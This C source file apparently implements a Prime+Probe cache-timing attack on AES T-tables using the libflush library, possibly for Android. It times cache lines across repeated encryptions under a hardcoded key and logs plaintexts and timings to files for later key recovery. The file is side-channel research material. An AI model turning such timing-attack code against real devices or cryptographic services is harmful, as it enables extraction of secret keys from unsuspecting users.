/* See LICENSE file for license and copyright information */

#define _GNU_SOURCE

#include "AES.h"
#include "gaddr.h"
#include "gset.h"
#include <getopt.h>
#include <inttypes.h>
#include <jni.h>
#include <libflush/libflush.h>
#include <malloc.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <time.h>
#include <unistd.h>

#define AES_TMP 1000     // tmp sample sum

#define BIND_TO_CPU 0
#define BIND_THREAD_TO_CPU 1
#define AES_TABLE_LENGTH 16    // the block num of aes look up table
#define AES_SAMPLE_SUM 500       // sample sum
#define AES_KEY_MAX_VALUE 16         // the possibility of key
#define AES_KEY_LENGTH 16       // the length of key
#define AES_PLAINTEXT_LENGTH 16 // the length of plaintext
#define TMP_NUMS 64


#define MINI(a, b) (((a) > (b)) ? (b) : (a))
#define MAXI(a, b) (((a) > (b)) ? (a) : (b))

void doaes(unsigned char *inaes, aesTableSet *tables); // execute aes algorithm with a given plaintext
void getPlaintext(unsigned char *plaintext); // return a random plaintext
void freeresource(uint64_t **tmp);
void getTmpTime(libflush_session_t *libflush_session, unsigned char *inaes, uint64_t **tmp, aesTableSet *tables);
void getTmpTime2(libflush_session_t *libflush_session, unsigned char *inaes, uint64_t **tmp, aesTableSet *tables);
void getTmpTime3(libflush_session_t *libflush_session, unsigned char *inaes, uint64_t **tmp, aesTableSet *tables);
void writePTF(unsigned char* inaes);
void writeT1TF(uint64_t **tmp);
void writeT2TF(uint64_t **tmp);

unsigned char key[AES_KEY_LENGTH] = {0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66,
                                     0x77, 0x88, 0x99, 0xaa, 0xbb, 0xcc,
                                     0xdd, 0xee, 0xff};                                                              

int main(int argc, char* argv[]) {

  aesTableSet tables; // the struct contains aes t-table's start addr
  libflush_session_t *libflush_session;

  /* Define parameters */
  size_t cpu;
  cpu = BIND_TO_CPU;
  size_t thread_cpu = BIND_THREAD_TO_CPU;

  size_t number_of_cpus = sysconf(_SC_NPROCESSORS_ONLN);

  fprintf(stdout, "NUMBER OF CPUS: %zu\n", number_of_cpus);

  /* Bind to CPU */
  cpu = cpu % number_of_cpus;
  thread_cpu = thread_cpu % number_of_cpus;

  if (libflush_bind_to_cpu(cpu) == false) {
    fprintf(stderr, "Warning: Could not bind to CPU: %zu\n", cpu);
  } else {
    fprintf(stdout, "attack process bind to cpu %d\n", BIND_TO_CPU);
  }

  /* Initialize libflush */
  libflush_session_args_t args;
  args.bind_to_cpu = thread_cpu;

  if (libflush_init(&libflush_session, &args) == false) {
    fprintf(stderr, "Error: Could not initialize libflush\n");
    return -1;
  }

  fprintf(stdout, "initialize libflush success!\n");

  fprintf(stdout, "now start aes attack\n");

  unsigned char inaes[AES_PLAINTEXT_LENGTH] = {0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66,
                                     0x77, 0x88, 0x99, 0xaa, 0xbb, 0xcc,
                                     0xdd, 0xee, 0xff};
  doaes(inaes, &tables);

  srand((unsigned int)time(0));

  uint64_t *tmp[TMP_NUMS];
  for (int i = 0; i < TMP_NUMS; i++) {
    tmp[i] = (uint64_t *)malloc(AES_TMP * sizeof(uint64_t));
    if (tmp[i] == NULL) {
      fprintf(stderr, "ERROR : could not allocate memory to tmp[%d]!!\n", i);
      return -1;
    }
    memset(tmp[i], 0, AES_TMP * sizeof(uint64_t));
  }

  for (int i = 0; i < AES_SAMPLE_SUM; i++) {
    getPlaintext(inaes);
    writePTF(inaes);
    getTmpTime(libflush_session, inaes, tmp, &tables);
  }

  freeresource(tmp);
  aes_ecb_encrypt(NULL, NULL, NULL, &tables);
  fprintf(stdout, "aes attack completed\n");
  return 0;
}

void getTmpTime(libflush_session_t *libflush_session, unsigned char *inaes, uint64_t **tmp, aesTableSet *tables) {
  int base0 = tables->t0_si[0];
  int base1 = tables->t1_si[0];
  int base2 = tables->t2_si[0];
  int base3 = tables->t3_si[0];
  for (int i = 0; i < AES_TMP; i++) {
    for (int j = 0; j < AES_TABLE_LENGTH; j++) {
      libflush_prime(libflush_session, base0 + j);
      libflush_prime(libflush_session, base1 + j);
      libflush_prime(libflush_session, base2 + j);
      libflush_prime(libflush_session, base3 + j);
    }
    for (int j = 0; j < AES_TABLE_LENGTH; j++) {
      tmp[j+AES_TABLE_LENGTH*0][i] = libflush_probe(libflush_session, base0 + j);
      tmp[j+AES_TABLE_LENGTH*1][i] = libflush_probe(libflush_session, base1 + j);
      tmp[j+AES_TABLE_LENGTH*2][i] = libflush_probe(libflush_session, base2 + j);
      tmp[j+AES_TABLE_LENGTH*3][i] = libflush_probe(libflush_session, base3 + j);
    }
  }
  writeT1TF(tmp);
  for (int i = 0; i < AES_TMP; i++) {
    for (int j = 0; j < AES_TABLE_LENGTH; j++) {
      libflush_prime(libflush_session, base0 + j);
      libflush_prime(libflush_session, base1 + j);
      libflush_prime(libflush_session, base2 + j);
      libflush_prime(libflush_session, base3 + j);
    }
    doaes(inaes, tables);
    for (int j = 0; j < AES_TABLE_LENGTH; j++) {
      tmp[j+AES_TABLE_LENGTH*0][i] = libflush_probe(libflush_session, base0 + j);
      tmp[j+AES_TABLE_LENGTH*1][i] = libflush_probe(libflush_session, base1 + j);
      tmp[j+AES_TABLE_LENGTH*2][i] = libflush_probe(libflush_session, base2 + j);
      tmp[j+AES_TABLE_LENGTH*3][i] = libflush_probe(libflush_session, base3 + j);
    }
  }
  writeT2TF(tmp);
}

void getTmpTime2(libflush_session_t *libflush_session, unsigned char *inaes, uint64_t **tmp, aesTableSet *tables) {
  int base = tables->t0_si[0];
  for (int i = 0; i < AES_TMP; i++) {
    for (int j = 0; j < AES_TABLE_LENGTH * 4; j++) {
      libflush_prime(libflush_session, base + j);
    }
    for (int j = 0; j < AES_TABLE_LENGTH * 4; j++) {
      tmp[j][i] = libflush_probe(libflush_session, base + j);
    }
  }
  writeT1TF(tmp);
  for (int i = 0; i < AES_TMP; i++) {
    for (int j = 0; j < AES_TABLE_LENGTH * 4; j++) {
      libflush_prime(libflush_session, base + j);
    }
    doaes(inaes, tables);
    for (int j = 0; j < AES_TABLE_LENGTH * 4; j++) {
      tmp[j][i] = libflush_probe(libflush_session, base + j);
    }
  }
  writeT2TF(tmp);
}

void getTmpTime3(libflush_session_t *libflush_session, unsigned char *inaes, uint64_t **tmp, aesTableSet *tables) {
  int base = tables->t0_si[0];
  uint64_t time = 0;
  for (int i = 0; i < AES_TMP; i++) {
    for (int j = 0; j < AES_TABLE_LENGTH * 4; j++) {
      libflush_prime(libflush_session, base + j);
      time = libflush_probe(libflush_session, base + j);
      tmp[j][i] = time;
    }
  }
  writeT1TF(tmp);
  for (int i = 0; i < AES_TMP; i++) {
    for (int j = 0; j < AES_TABLE_LENGTH * 4; j++) {
      libflush_prime(libflush_session, base + j);
      doaes(inaes, tables);
      time = libflush_probe(libflush_session, base + j);
      tmp[j][i] = time;
    }
  }
  writeT2TF(tmp);
}

void writePTF(unsigned char* inaes) {
  FILE* file = NULL;
  if ((file = fopen("plaintext", "a")) == NULL) {
    fprintf(stderr, "ERROR : could not open file plaintext!\n");
    return;
  }
  for (int i = 0; i < 16; i++) {
    fprintf(file, "%4zu", inaes[i]);
  }
  fprintf(file, "\n");
  fflush(file);
  fclose(file);
}

void writeT1TF(uint64_t **tmp) {
  FILE* file = NULL;
  if ((file = fopen("ntime", "a")) == NULL) {
    fprintf(stderr, "ERROR : could not open file ntime!\n");
    return;
  }
  for (int i = 0; i < TMP_NUMS; i++) {
    for (int j = 0; j < AES_TMP; j++) {
      fprintf(file, "%10zu", tmp[i][j]);
    }
    fprintf(file, "\n");
  }
  fflush(file);
  fclose(file);
  for (int i = 0; i < AES_TABLE_LENGTH * 4; i++) {
    for (int j = 0; j < AES_TMP; j++) {
      tmp[i][j] = 0;
    }
  }
}

void writeT2TF(uint64_t **tmp) {
  FILE* file = NULL;
  if ((file = fopen("time", "a")) == NULL) {
    fprintf(stderr, "ERROR : could not open file time!\n");
    return;
  }
  for (int i = 0; i < TMP_NUMS; i++) {
    for (int j = 0; j < AES_TMP; j++) {
      fprintf(file, "%10zu", tmp[i][j]);
    }
    fprintf(file, "\n");
  }
  fflush(file);
  fclose(file);
  for (int i = 0; i < AES_TABLE_LENGTH * 4; i++) {
    for (int j = 0; j < AES_TMP; j++) {
      tmp[i][j] = 0;
    }
  }
}

void doaes(unsigned char *inaes, aesTableSet *tables) {
  unsigned char outaes[16] = {0};
  aes_ecb_encrypt(key, inaes, outaes, tables);
}

void getPlaintext(unsigned char *plaintext) {
  for (int i = 0; i < AES_PLAINTEXT_LENGTH; i++) {
    plaintext[i] = (rand() % 256);
  }
}

void freeresource(uint64_t **tmp) {
  for (int i = 0; i < TMP_NUMS; i++) {
    if (tmp[i] != NULL)
      free(tmp[i]);
  }
}
